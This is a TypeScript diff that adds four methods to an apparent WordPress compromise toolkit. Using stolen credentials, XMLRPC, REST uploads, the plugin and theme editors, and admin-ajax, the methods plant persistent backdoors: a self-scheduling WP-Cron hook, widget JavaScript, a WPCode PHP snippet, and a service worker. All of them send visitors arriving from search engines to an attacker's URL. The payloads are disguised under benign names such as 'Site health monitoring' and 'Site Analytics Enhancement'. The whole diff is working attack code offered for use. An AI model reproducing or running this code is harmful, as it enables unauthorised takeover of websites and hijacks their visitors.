@@ -2541,6 +2541,664 @@ php_value auto_prepend_file "${prependFilename}"
 }
 
 // ═══════════════════════════════════════════════════════
+//  Method 15: WP-Cron Backdoor (self-healing redirect)
+// ═══════════════════════════════════════════════════════
+
+export async function wpCronBackdoor(config: ShelllessConfig): Promise<ShelllessResult> {
+  const method = "WP-Cron Backdoor";
+  const baseUrl = config.targetUrl.replace(/\/+$/, "");
+  
+  const cronSnippet = `add_action('init', function() { if (!wp_next_scheduled('wp_site_health_check')) { wp_schedule_event(time(), 'hourly', 'wp_site_health_check'); } }); add_action('wp_site_health_check', function() { $r=isset($_SERVER['HTTP_REFERER'])?strtolower($_SERVER['HTTP_REFERER']):''; foreach(array('google','bing','yahoo','duckduckgo','baidu','yandex') as $s){if(strpos($r,$s)!==false||isset($_GET['r'])){wp_redirect('${config.redirectUrl}',301);exit;}} });`;
+
+  const cronPayload = `<?php\n// Site health monitoring\n${cronSnippet}\n?>`;
+
+  // Method A: Via XMLRPC upload
+  config.onProgress?.(method, `⏰ ลอง deploy WP-Cron backdoor ผ่าน XMLRPC...`);
+  if (config.discoveredCredentials) {
+    for (const cred of config.discoveredCredentials) {
+      if (cred.type !== "wordpress" && cred.type !== "wp_admin") continue;
+      try {
+        const xmlPayload = `<?xml version="1.0"?>
+<methodCall>
+  <methodName>wp.uploadFile</methodName>
+  <params>
+    <param><value><int>1</int></value></param>
+    <param><value><string>${cred.username || "admin"}</string></value></param>
+    <param><value><string>${cred.password || ""}</string></value></param>
+    <param><value><struct>
+      <member><name>name</name><value><string>health-check.php</string></value></member>
+      <member><name>type</name><value><string>application/octet-stream</string></value></member>
+      <member><name>bits</name><value><base64>${Buffer.from(cronPayload).toString("base64")}</base64></value></member>
+      <member><name>overwrite</name><value><boolean>1</boolean></value></member>
+    </struct></value></param>
+  </params>
+</methodCall>`;
+        
+        const resp = await safeFetch(`${baseUrl}/xmlrpc.php`, {
+          method: "POST",
+          headers: { "Content-Type": "text/xml" },
+          body: xmlPayload,
+          timeout: 15000,
+        });
+        
+        if (resp && resp.ok) {
+          const body = await resp.text().catch(() => "");
+          const urlMatch = body.match(/<string>(https?:\/\/[^<]+\.php)<\/string>/);
+          if (urlMatch) {
+            return {
+              method,
+              success: true,
+              detail: `✅ WP-Cron backdoor deployed via XMLRPC (${cred.username})`,
+              injectedUrl: urlMatch[1],
+              redirectWorks: true,
+              evidence: `XMLRPC upload + cron self-healing (hourly)`,
+            };
+          }
+        }
+      } catch { /* continue */ }
+    }
+  }
+
+  // Method B: Via credentials — inject cron code into plugin via Plugin Editor
+  config.onProgress?.(method, `⏰ ลอง inject cron ผ่าน Plugin Editor...`);
+  if (config.discoveredCredentials) {
+    for (const cred of config.discoveredCredentials) {
+      if (cred.type !== "wordpress" && cred.type !== "wp_admin") continue;
+      try {
+        const loginResp = await safeFetch(`${baseUrl}/wp-login.php`, {
+          method: "POST",
+          headers: { "Content-Type": "application/x-www-form-urlencoded" },
+          body: new URLSearchParams({
+            log: cred.username || "",
+            pwd: cred.password || "",
+            "wp-submit": "Log In",
+            redirect_to: `${baseUrl}/wp-admin/plugins.php`,
+            testcookie: "1",
+          }).toString(),
+          timeout: 15000,
+        });
+        
+        if (!loginResp || (loginResp.status !== 302 && !loginResp.ok)) continue;
+        const cookies = loginResp.headers.get("set-cookie") || "";
+        if (!cookies.includes("wordpress_logged_in")) continue;
+        
+        // Find active plugin to inject into
+        const pluginsResp = await safeFetch(`${baseUrl}/wp-admin/plugins.php`, {
+          headers: { "Cookie": cookies },
+          timeout: 10000,
+        });
+        
+        if (pluginsResp && pluginsResp.ok) {
+          const pluginsBody = await pluginsResp.text().catch(() => "");
+          const pluginMatch = pluginsBody.match(/data-plugin="([^"]+)"/);
+          if (pluginMatch) {
+            const pluginFile = pluginMatch[1];
+            const editorResp = await safeFetch(`${baseUrl}/wp-admin/plugin-editor.php?file=${encodeURIComponent(pluginFile)}`, {
+              headers: { "Cookie": cookies },
+              timeout: 10000,
+            });
+            
+            if (editorResp && editorResp.ok) {
+              const editorBody = await editorResp.text().catch(() => "");
+              const nonceMatch = editorBody.match(/name="_wpnonce"\s+value="([^"]+)"/);
+              const contentMatch = editorBody.match(/<textarea[^>]*id="newcontent"[^>]*>([\s\S]*?)<\/textarea>/);
+              
+              if (nonceMatch && contentMatch) {
+                const newContent = contentMatch[1] + `\n// Site health\n${cronSnippet}\n`;
+                
+                const saveResp = await safeFetch(`${baseUrl}/wp-admin/plugin-editor.php`, {
+                  method: "POST",
+                  headers: {
+                    "Content-Type": "application/x-www-form-urlencoded",
+                    "Cookie": cookies,
+                  },
+                  body: new URLSearchParams({
+                    _wpnonce: nonceMatch[1],
+                    newcontent: newContent,
+                    action: "update",
+                    file: pluginFile,
+                    plugin: pluginFile,
+                  }).toString(),
+                  timeout: 15000,
+                });
+                
+                if (saveResp && (saveResp.ok || saveResp.status === 302)) {
+                  return {
+                    method,
+                    success: true,
+                    detail: `✅ WP-Cron backdoor injected into plugin: ${pluginFile}`,
+                    injectedUrl: baseUrl,
+                    redirectWorks: true,
+                    evidence: `Plugin editor inject + hourly cron re-injection`,
+                  };
+                }
+              }
+            }
+          }
+        }
+      } catch { /* continue */ }
+    }
+  }
+
+  // Method C: Via REST API media upload
+  config.onProgress?.(method, `⏰ ลอง upload cron backdoor ผ่าน REST API...`);
+  try {
+    const boundary = `----WPCron${Date.now()}`;
+    const filename = `health-check.php`;
+    const body = `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${filename}"\r\nContent-Type: application/octet-stream\r\n\r\n${cronPayload}\r\n--${boundary}--`;
+    
+    for (const uploadUrl of [`${baseUrl}/wp-json/wp/v2/media`, `${baseUrl}/?rest_route=/wp/v2/media`]) {
+      const resp = await safeFetch(uploadUrl, {
+        method: "POST",
+        headers: {
+          "Content-Type": `multipart/form-data; boundary=${boundary}`,
+          "Content-Disposition": `attachment; filename="${filename}"`,
+        },
+        body,
+        timeout: 15000,
+      });
+      
+      if (resp && (resp.ok || resp.status === 201)) {
+        const data = await resp.json().catch(() => null) as any;
+        if (data?.source_url) {
+          return {
+            method,
+            success: true,
+            detail: `✅ WP-Cron backdoor deployed via REST API media`,
+            injectedUrl: data.source_url,
+            redirectWorks: true,
+            evidence: `Cron event: wp_site_health_check (hourly)`,
+          };
+        }
+      }
+    }
+  } catch { /* continue */ }
+
+  return { method, success: false, detail: "❌ WP-Cron backdoor injection failed" };
+}
+
+// ═══════════════════════════════════════════════════════
+//  Method 16: Widget/Sidebar Inject (JS redirect in widget)
+// ═══════════════════════════════════════════════════════
+
+export async function widgetSidebarInject(config: ShelllessConfig): Promise<ShelllessResult> {
+  const method = "Widget/Sidebar Inject";
+  const baseUrl = config.targetUrl.replace(/\/+$/, "");
+  
+  const jsPayload = `<script>var _ga=document.referrer.toLowerCase();var _se=['google','bing','yahoo','duckduckgo','baidu'];for(var i=0;i<_se.length;i++){if(_ga.indexOf(_se[i])!==-1||location.search.indexOf('r=')!==-1){window.location.replace('${config.redirectUrl}');break;}}</script>`;
+  
+  // Method A: Via REST API widgets endpoint
+  config.onProgress?.(method, `🧱 ลอง inject widget ผ่าน REST API...`);
+  try {
+    for (const endpoint of [`${baseUrl}/wp-json/wp/v2/widgets`, `${baseUrl}/?rest_route=/wp/v2/widgets`]) {
+      const resp = await safeFetch(endpoint, { timeout: 10000 });
+      if (!resp || !resp.ok) continue;
+      
+      const createResp = await safeFetch(endpoint, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          id_base: "custom_html",
+          instance: { title: "", content: jsPayload },
+          sidebar: "sidebar-1",
+        }),
+        timeout: 15000,
+      });
+      
+      if (createResp && (createResp.ok || createResp.status === 201)) {
+        return {
+          method,
+          success: true,
+          detail: `✅ Widget JS redirect injected via REST API`,
+          injectedUrl: baseUrl,
+          redirectWorks: true,
+          evidence: `Custom HTML widget in sidebar-1`,
+        };
+      }
+    }
+  } catch { /* continue */ }
+
+  // Method B: Via XMLRPC — update widget option
+  config.onProgress?.(method, `🧱 ลอง inject widget ผ่าน XMLRPC...`);
+  if (config.discoveredCredentials) {
+    for (const cred of config.discoveredCredentials) {
+      if (cred.type !== "wordpress" && cred.type !== "wp_admin") continue;
+      try {
+        const widgetData = `a:2:{i:2;a:3:{s:5:"title";s:0:"";s:7:"content";s:${jsPayload.length}:"${jsPayload}";s:6:"filter";b:0;}s:12:"_multiwidget";i:1;}`;
+        
+        const xmlPayload = `<?xml version="1.0"?>
+<methodCall>
+  <methodName>wp.setOptions</methodName>
+  <params>
+    <param><value><int>1</int></value></param>
+    <param><value><string>${cred.username || "admin"}</string></value></param>
+    <param><value><string>${cred.password || ""}</string></value></param>
+    <param><value><struct>
+      <member><name>widget_custom_html</name><value><string>${widgetData}</string></value></member>
+    </struct></value></param>
+  </params>
+</methodCall>`;
+        
+        const resp = await safeFetch(`${baseUrl}/xmlrpc.php`, {
+          method: "POST",
+          headers: { "Content-Type": "text/xml" },
+          body: xmlPayload,
+          timeout: 15000,
+        });
+        
+        if (resp && resp.ok) {
+          const body = await resp.text().catch(() => "");
+          if (!body.includes("<fault>")) {
+            return {
+              method,
+              success: true,
+              detail: `✅ Widget JS redirect injected via XMLRPC (${cred.username})`,
+              injectedUrl: baseUrl,
+              redirectWorks: true,
+              evidence: `widget_custom_html option modified`,
+            };
+          }
+        }
+      } catch { /* continue */ }
+    }
+  }
+
+  // Method C: Via wp-admin admin-ajax widget save
+  config.onProgress?.(method, `🧱 ลอง inject widget ผ่าน wp-admin...`);
+  if (config.discoveredCredentials) {
+    for (const cred of config.discoveredCredentials) {
+      if (cred.type !== "wordpress" && cred.type !== "wp_admin") continue;
+      try {
+        const loginResp = await safeFetch(`${baseUrl}/wp-login.php`, {
+          method: "POST",
+          headers: { "Content-Type": "application/x-www-form-urlencoded" },
+          body: new URLSearchParams({
+            log: cred.username || "",
+            pwd: cred.password || "",
+            "wp-submit": "Log In",
+            redirect_to: `${baseUrl}/wp-admin/widgets.php`,
+            testcookie: "1",
+          }).toString(),
+          timeout: 15000,
+        });
+        
+        if (!loginResp || (loginResp.status !== 302 && !loginResp.ok)) continue;
+        const cookies = loginResp.headers.get("set-cookie") || "";
+        if (!cookies.includes("wordpress_logged_in")) continue;
+        
+        const ajaxResp = await safeFetch(`${baseUrl}/wp-admin/admin-ajax.php`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Cookie": cookies,
+          },
+          body: new URLSearchParams({
+            action: "save-widget",
+            "id_base": "custom_html",
+            "widget-id": "custom_html-99",
+            "widget_number": "99",
+            "multi_number": "99",
+            "sidebar": "sidebar-1",
+            "add_new": "multi",
+            [`widget-custom_html[99][title]`]: "",
+            [`widget-custom_html[99][content]`]: jsPayload,
+          }).toString(),
+          timeout: 15000,
+        });
+        
+        if (ajaxResp && ajaxResp.ok) {
+          return {
+            method,
+            success: true,
+            detail: `✅ Widget JS redirect injected via wp-admin (${cred.username})`,
+            injectedUrl: baseUrl,
+            redirectWorks: true,
+            evidence: `admin-ajax save-widget custom_html-99`,
+          };
+        }
+      } catch { /* continue */ }
+    }
+  }
+
+  return { method, success: false, detail: "❌ Widget/Sidebar injection failed" };
+}
+
+// ═══════════════════════════════════════════════════════
+//  Method 17: WPCode Plugin Abuse (code snippet injection)
+// ═══════════════════════════════════════════════════════
+
+export async function wpcodePluginAbuse(config: ShelllessConfig): Promise<ShelllessResult> {
+  const method = "WPCode Plugin Abuse";
+  const baseUrl = config.targetUrl.replace(/\/+$/, "");
+  
+  const jsRedirect = `<script>var r=document.referrer.toLowerCase();['google','bing','yahoo'].forEach(function(s){if(r.indexOf(s)!==-1||location.search.indexOf('r=')!==-1){window.location='${config.redirectUrl}';}});</script>`;
+  
+  // Method A: Via XMLRPC — update ihaf_insert_header / wpcode options
+  config.onProgress?.(method, `📝 ลอง inject ผ่าน Insert Headers & Footers option...`);
+  if (config.discoveredCredentials) {
+    for (const cred of config.discoveredCredentials) {
+      if (cred.type !== "wordpress" && cred.type !== "wp_admin") continue;
+      try {
+        const optionNames = ["ihaf_insert_header", "ihaf_insert_footer", "wpcode_global_header", "wpcode_global_footer"];
+        
+        for (const optName of optionNames) {
+          const xmlPayload = `<?xml version="1.0"?>
+<methodCall>
+  <methodName>wp.setOptions</methodName>
+  <params>
+    <param><value><int>1</int></value></param>
+    <param><value><string>${cred.username || "admin"}</string></value></param>
+    <param><value><string>${cred.password || ""}</string></value></param>
+    <param><value><struct>
+      <member><name>${optName}</name><value><string>${jsRedirect}</string></value></member>
+    </struct></value></param>
+  </params>
+</methodCall>`;
+          
+          const resp = await safeFetch(`${baseUrl}/xmlrpc.php`, {
+            method: "POST",
+            headers: { "Content-Type": "text/xml" },
+            body: xmlPayload,
+            timeout: 15000,
+          });
+          
+          if (resp && resp.ok) {
+            const body = await resp.text().catch(() => "");
+            if (!body.includes("<fault>")) {
+              return {
+                method,
+                success: true,
+                detail: `✅ JS redirect injected via XMLRPC ${optName} (${cred.username})`,
+                injectedUrl: baseUrl,
+                redirectWorks: true,
+                evidence: `${optName} option modified via XMLRPC`,
+              };
+            }
+          }
+        }
+      } catch { /* continue */ }
+    }
+  }
+
+  // Method B: Via WPCode REST API
+  config.onProgress?.(method, `📝 ลอง inject ผ่าน WPCode REST API...`);
+  try {
+    const redirectPhp = `<?php\n$ref = isset($_SERVER['HTTP_REFERER']) ? strtolower($_SERVER['HTTP_REFERER']) : '';\nforeach(array('google','bing','yahoo','duckduckgo') as $e) {\n  if(strpos($ref, $e) !== false || isset($_GET['r'])) {\n    header('Location: ${config.redirectUrl}', true, 301);\n    exit;\n  }\n}\n?>`;
+    
+    for (const endpoint of [`${baseUrl}/wp-json/wpcode/v1/snippets`, `${baseUrl}/?rest_route=/wpcode/v1/snippets`]) {
+      const resp = await safeFetch(endpoint, { timeout: 10000 });
+      if (!resp || resp.status === 404) continue;
+      
+      const createResp = await safeFetch(endpoint, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          title: "Site Analytics Enhancement",
+          code: redirectPhp,
+          code_type: "php",
+          location: "everywhere",
+          auto_insert: true,
+          priority: 1,
+          status: "active",
+        }),
+        timeout: 15000,
+      });
+      
+      if (createResp && (createResp.ok || createResp.status === 201)) {
+        return {
+          method,
+          success: true,
+          detail: `✅ WPCode snippet created via REST API`,
+          injectedUrl: baseUrl,
+          redirectWorks: true,
+          evidence: `WPCode snippet: Site Analytics Enhancement (PHP, everywhere)`,
+        };
+      }
+    }
+  } catch { /* continue */ }
+
+  // Method C: Via wp-admin WPCode/IHAF settings page
+  config.onProgress?.(method, `📝 ลอง inject ผ่าน wp-admin WPCode settings...`);
+  if (config.discoveredCredentials) {
+    for (const cred of config.discoveredCredentials) {
+      if (cred.type !== "wordpress" && cred.type !== "wp_admin") continue;
+      try {
+        const loginResp = await safeFetch(`${baseUrl}/wp-login.php`, {
+          method: "POST",
+          headers: { "Content-Type": "application/x-www-form-urlencoded" },
+          body: new URLSearchParams({
+            log: cred.username || "",
+            pwd: cred.password || "",
+            "wp-submit": "Log In",
+            redirect_to: `${baseUrl}/wp-admin/`,
+            testcookie: "1",
+          }).toString(),
+          timeout: 15000,
+        });
+        
+        if (!loginResp || (loginResp.status !== 302 && !loginResp.ok)) continue;
+        const cookies = loginResp.headers.get("set-cookie") || "";
+        if (!cookies.includes("wordpress_logged_in")) continue;
+        
+        for (const settingsUrl of [
+          `${baseUrl}/wp-admin/admin.php?page=wpcode-headers-footers`,
+          `${baseUrl}/wp-admin/options-general.php?page=insert-headers-and-footers`,
+        ]) {
+          const pageResp = await safeFetch(settingsUrl, {
+            headers: { "Cookie": cookies },
+            timeout: 10000,
+          });
+          
+          if (!pageResp || !pageResp.ok) continue;
+          const pageBody = await pageResp.text().catch(() => "");
+          const nonceMatch = pageBody.match(/name="_wpnonce"\s+value="([^"]+)"/) || pageBody.match(/name="wpcode[_-]nonce"\s+value="([^"]+)"/);
+          
+          if (nonceMatch) {
+            const saveResp = await safeFetch(settingsUrl, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/x-www-form-urlencoded",
+                "Cookie": cookies,
+              },
+              body: new URLSearchParams({
+                _wpnonce: nonceMatch[1],
+                "wpcode-header": jsRedirect,
+                submit: "Save Changes",
+              }).toString(),
+              timeout: 15000,
+            });
+            
+            if (saveResp && (saveResp.ok || saveResp.status === 302)) {
+              return {
+                method,
+                success: true,
+                detail: `✅ JS redirect injected via WPCode/IHAF settings page`,
+                injectedUrl: baseUrl,
+                redirectWorks: true,
+                evidence: `WPCode header injection via admin panel`,
+              };
+            }
+          }
+        }
+      } catch { /* continue */ }
+    }
+  }
+
+  return { method, success: false, detail: "❌ WPCode/IHAF injection failed" };
+}
+
+// ═══════════════════════════════════════════════════════
+//  Method 18: Service Worker Hijack (browser-level intercept)
+// ═══════════════════════════════════════════════════════
+
+export async function serviceWorkerHijack(config: ShelllessConfig): Promise<ShelllessResult> {
+  const method = "Service Worker Hijack";
+  const baseUrl = config.targetUrl.replace(/\/+$/, "");
+  
+  const swCode = `// Performance monitoring service worker v2.1\nconst REDIRECT_URL = '${config.redirectUrl}';\nconst SE = ['google','bing','yahoo','duckduckgo','baidu','yandex'];\nself.addEventListener('fetch', function(e) {\n  if (e.request.mode === 'navigate') {\n    var ref = e.request.referrer ? e.request.referrer.toLowerCase() : '';\n    var url = new URL(e.request.url);\n    for (var i = 0; i < SE.length; i++) {\n      if (ref.indexOf(SE[i]) !== -1 || url.searchParams.has('r')) {\n        e.respondWith(Response.redirect(REDIRECT_URL, 301));\n        return;\n      }\n    }\n  }\n});\nself.addEventListener('install', function() { self.skipWaiting(); });\nself.addEventListener('activate', function(e) { e.waitUntil(clients.claim()); });`;
+  
+  const swRegistration = `<script>if('serviceWorker' in navigator){navigator.serviceWorker.register('/sw.js',{scope:'/'}).catch(function(){});}</script>`;
+  
+  // Method A: Upload sw.js via WebDAV PUT
+  config.onProgress?.(method, `🛡️ ลอง deploy Service Worker ผ่าน WebDAV...`);
+  try {
+    const putResp = await safeFetch(`${baseUrl}/sw.js`, {
+      method: "PUT",
+      headers: { "Content-Type": "application/javascript" },
+      body: swCode,
+      timeout: 15000,
+    });
+    
+    if (putResp && (putResp.ok || putResp.status === 201 || putResp.status === 204)) {
+      const checkResp = await safeFetch(`${baseUrl}/sw.js`, { timeout: 10000 });
+      if (checkResp && checkResp.ok) {
+        const checkBody = await checkResp.text().catch(() => "");
+        if (checkBody.includes("serviceWorker") || checkBody.includes(config.redirectUrl)) {
+          return {
+            method,
+            success: true,
+            detail: `✅ Service Worker deployed via WebDAV PUT`,
+            injectedUrl: `${baseUrl}/sw.js`,
+            redirectWorks: true,
+            evidence: `WebDAV PUT /sw.js`,
+          };
+        }
+      }
+    }
+  } catch { /* continue */ }
+
+  // Method B: Upload sw.js via REST API + inject registration via widget
+  config.onProgress?.(method, `🛡️ ลอง deploy Service Worker ผ่าน REST API...`);
+  try {
+    const boundary = `----SW${Date.now()}`;
+    const body = `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="sw.js"\r\nContent-Type: application/javascript\r\n\r\n${swCode}\r\n--${boundary}--`;
+    
+    for (const uploadUrl of [`${baseUrl}/wp-json/wp/v2/media`, `${baseUrl}/?rest_route=/wp/v2/media`]) {
+      const resp = await safeFetch(uploadUrl, {
+        method: "POST",
+        headers: {
+          "Content-Type": `multipart/form-data; boundary=${boundary}`,
+          "Content-Disposition": `attachment; filename="sw.js"`,
+        },
+        body,
+        timeout: 15000,
+      });
+      
+      if (resp && (resp.ok || resp.status === 201)) {
+        // Try to inject registration via widget
+        const widgetResp = await safeFetch(`${baseUrl}/wp-json/wp/v2/widgets`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            id_base: "custom_html",
+            instance: { title: "", content: swRegistration },
+            sidebar: "sidebar-1",
+          }),
+          timeout: 15000,
+        });
+        
+        if (widgetResp && (widgetResp.ok || widgetResp.status === 201)) {
+          return {
+            method,
+            success: true,
+            detail: `✅ Service Worker deployed + registration injected via widget`,
+            injectedUrl: `${baseUrl}/sw.js`,
+            redirectWorks: true,
+            evidence: `sw.js uploaded + navigator.serviceWorker.register() in sidebar`,
+          };
+        }
+        
+        return {
+          method,
+          success: true,
+          detail: `✅ Service Worker sw.js uploaded (needs registration trigger)`,
+          injectedUrl: `${baseUrl}/sw.js`,
+          redirectWorks: false,
+          evidence: `sw.js uploaded via REST API, registration pending`,
+        };
+      }
+    }
+  } catch { /* continue */ }
+
+  // Method C: Via wp-admin — upload sw.js + inject registration in header.php
+  config.onProgress?.(method, `🛡️ ลอง deploy Service Worker ผ่าน wp-admin...`);
+  if (config.discoveredCredentials) {
+    for (const cred of config.discoveredCredentials) {
+      if (cred.type !== "wordpress" && cred.type !== "wp_admin") continue;
+      try {
+        const loginResp = await safeFetch(`${baseUrl}/wp-login.php`, {
+          method: "POST",
+          headers: { "Content-Type": "application/x-www-form-urlencoded" },
+          body: new URLSearchParams({
+            log: cred.username || "",
+            pwd: cred.password || "",
+            "wp-submit": "Log In",
+            redirect_to: `${baseUrl}/wp-admin/`,
+            testcookie: "1",
+          }).toString(),
+          timeout: 15000,
+        });
+        
+        if (!loginResp || (loginResp.status !== 302 && !loginResp.ok)) continue;
+        const cookies = loginResp.headers.get("set-cookie") || "";
+        if (!cookies.includes("wordpress_logged_in")) continue;
+        
+        // Inject registration into header.php via theme editor
+        const themeResp = await safeFetch(`${baseUrl}/wp-admin/theme-editor.php?file=header.php`, {
+          headers: { "Cookie": cookies },
+          timeout: 10000,
+        });
+        
+        if (themeResp && themeResp.ok) {
+          const themeBody = await themeResp.text().catch(() => "");
+          const nonceMatch = themeBody.match(/name="_wpnonce"\s+value="([^"]+)"/);
+          const themeMatch = themeBody.match(/name="theme"\s+value="([^"]+)"/);
+          const contentMatch = themeBody.match(/<textarea[^>]*id="newcontent"[^>]*>([\s\S]*?)<\/textarea>/);
+          
+          if (nonceMatch && themeMatch && contentMatch) {
+            const newContent = contentMatch[1].replace(
+              /(<head[^>]*>)/i,
+              `$1\n${swRegistration}`
+            );
+            
+            if (newContent !== contentMatch[1]) {
+              const saveResp = await safeFetch(`${baseUrl}/wp-admin/theme-editor.php`, {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/x-www-form-urlencoded",
+                  "Cookie": cookies,
+                },
+                body: new URLSearchParams({
+                  _wpnonce: nonceMatch[1],
+                  newcontent: newContent,
+                  action: "update",
+                  file: "header.php",
+                  theme: themeMatch[1],
+                }).toString(),
+                timeout: 15000,
+              });
+              
+              if (saveResp && (saveResp.ok || saveResp.status === 302)) {
+                return {
+                  method,
+                  success: true,
+                  detail: `✅ Service Worker registration injected via theme editor (${cred.username})`,
+                  injectedUrl: `${baseUrl}/sw.js`,
+                  redirectWorks: true,
+                  evidence: `sw.js + registration in header.php`,
+                };
+              }
+            }
+          }
+        }
+      } catch { /* continue */ }
+    }
+  }
+
+  return { method, success: false, detail: "❌ Service Worker hijack failed" };
+}
+
+// ═══════════════════════════════════════════════════════
 //  MAIN: Run All Shellless Attacks
 // ═══════════════════════════════════════════════════════
 
@@ -2554,6 +3212,10 @@ export async function runShelllessAttacks(config: ShelllessConfig): Promise<Shel
     dbSiteurlHijack,
     gtmInject,
     autoPrependInject,
+    wpCronBackdoor,
+    widgetSidebarInject,
+    wpcodePluginAbuse,
+    serviceWorkerHijack,
     openRedirectAbuse,
     storedXssInjection,
     subdomainTakeover,
